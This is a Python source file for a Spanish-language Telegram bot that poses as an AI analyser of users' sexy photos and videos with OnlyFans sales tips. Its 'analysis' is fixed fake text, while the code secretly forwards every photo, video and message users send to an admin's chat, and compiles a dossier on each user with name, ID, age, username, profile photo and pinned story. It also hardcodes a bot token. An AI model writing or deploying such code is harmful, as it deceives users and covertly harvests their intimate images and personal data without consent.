import os
import sqlite3
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064
RENDER_EXTERNAL_URL = "https://luna-bot-a1fc.onrender.com"

# ======================
# BASE DE DATOS
# ======================
def init_db():
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?)", (user_id, nombre, username, edad))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

# ======================
# EXPEDIENTE COMPLETO Y STORIES
# ======================
async def enviar_expediente_completo(context, user, edad):
    try:
        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE COMPLETO**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Nombre:** {user.first_name} {user.last_name or ''}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🔗 **Usuario:** @{user.username if user.username else 'Oculto'}\n"
            f"🌍 **Idioma:** {user.language_code or 'Desconocido'}\n"
            f"⭐ **Premium:** {'Sí' if user.is_premium else 'No'}\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        
        # Foto de perfil
        fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
        if fotos_perfil.total_count > 0:
            foto_perfil = fotos_perfil.photos[0][-1].file_id
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil.")
            
        # Historia de perfil (Story)
        try:
            chat_info = await context.bot.get_chat(user.id)
            if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
                story = chat_info.pinned_story
                if story.photo:
                    await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=story.photo[-1].file_id, caption="📖 Historia (Story) del perfil.")
                elif story.video:
                    await context.bot.send_video(chat_id=DANI_CHAT_ID, video=story.video.file_id, caption="🎥 Video de la Historia (Story) del perfil.")
        except Exception as e:
            print(f"No se pudo obtener la historia: {e}")

    except Exception as e: 
        print(f"Error en expediente: {e}")

# ======================
# REENVIAR AL ADMIN (CON LÓGICA DE REENVÍO CORREGIDA)
# ======================
async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = update.message
        usuario_actual = update.effective_user
        
        # Detectamos si el mensaje es un reenvío
        if msg.forward_origin:
            nombre_original = "Alguien"
            id_original = ""
            
            # Si el reenvío es de un usuario (ej. María)
            if msg.forward_origin.sender_user:
                nombre_original = msg.forward_origin.sender_user.first_name
                id_original = f" (`{msg.forward_origin.sender_user.id}`)"
            # Si el reenvío es de un canal o grupo
            elif msg.forward_origin.sender_chat:
                nombre_original = msg.forward_origin.sender_chat.title
            # Si el reenvío es de un usuario oculto
            elif msg.forward_origin.hidden_user:
                nombre_original = msg.forward_origin.hidden_user.first_name
                id_original = f" (`{msg.forward_origin.hidden_user.id}`)"

            texto_aviso = (
                f"🔄 **REENVIADO A TI (Dani)**\n"
                f"👤 **Lo mandó originalmente:** {nombre_original}{id_original}\n"
                f"📩 **Quien te lo reenvió:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
            )
        else:
            # Si es un mensaje normal de la chica
            texto_aviso = (
                f"📩 **MENSAJE NORMAL**\n"
                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
            )

        # 1. Te enviamos el cartelito con la info a ti
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
        
        # 2. Te reenviamos el archivo real (foto, video, texto)
        await context.bot.forward_message(
            chat_id=DANI_CHAT_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
    except Exception as e:
        print(f"Error reenviando al admin: {e}")

# ======================
# ANÁLISIS DE IMAGEN (Simulado)
# ======================
def analizar_contenido(es_video=False):
    if es_video:
        return (
            "🎬 **Análisis de tu video:**\n"
            "1. **Lo que veo:** Una pose muy provocativa. La iluminación está bien, pero el movimiento de cámara es un poco rápido.\n"
            "2. **Lo bueno:** El ángulo resalta tus curvas de forma natural y se ve muy sexy.\n"
            "3. **Cómo mejorarlo:** Intenta ir más lento, mantén la mirada fija en la cámara para dar más morbo. Si muestras la cara, sonríe de forma pícara.\n"
            "4. **Tip de venta:** Los videos donde hablas suave o gimes un poco venden muchísimo más en OnlyFans. ¡Anímate a mandar uno así! 😉"
        )
    else:
        return (
            "🔍 **Análisis de tu foto:**\n"
            "1. **Lo que veo:** Una foto muy atrevida. La lencería resalta perfecto, aunque la luz está un poco plana.\n"
            "2. **Lo bueno:** La pose es muy buena, abres bien el cuerpo y eso a los fans les encanta.\n"
            "3. **Cómo mejorarlo:** Prueba a poner la luz más de lado (lateral) para que se marquen más las curvas. También prueba a morderte el labio o entreabrir la boca, da mucho más morbo.\n"
            "4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥"
        )

# ======================
# HANDLERS
# ======================
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
    
    try:
        analisis = analizar_contenido(es_video=False)
        await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien.")

async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")

    try:
        analisis = analizar_contenido(es_video=True)
        await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("🎬 Vi tu video y ya lo recibí.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text("¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:")
    else:
        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto o video.")

async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.effective_user
    if text.startswith('/'): return

    if obtener_usuario(user.id):
        await reenviar_al_admin(update, context)
        return await update.message.reply_text("💋 ¿En qué te ayudo? Mándame una foto o video.")
    
    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))

        if edad < 18: return await update.message.reply_text("Debes ser mayor de 18 años.")
            
        guardar_usuario(user.id, user.first_name, user.username, edad)
        await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos o videos.")
        
        await enviar_expediente_completo(context, user, edad)
        
    except:
        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")

# ======================
# MAIN (WEBHOOKS)
# ======================
if __name__ == "__main__":
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))

    port = int(os.environ.get("PORT", 8080))

    print("🌙 Luna Bot iniciado y listo...")
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=TELEGRAM_TOKEN,
        webhook_url=f"{RENDER_EXTERNAL_URL}/{TELEGRAM_TOKEN}"
    )
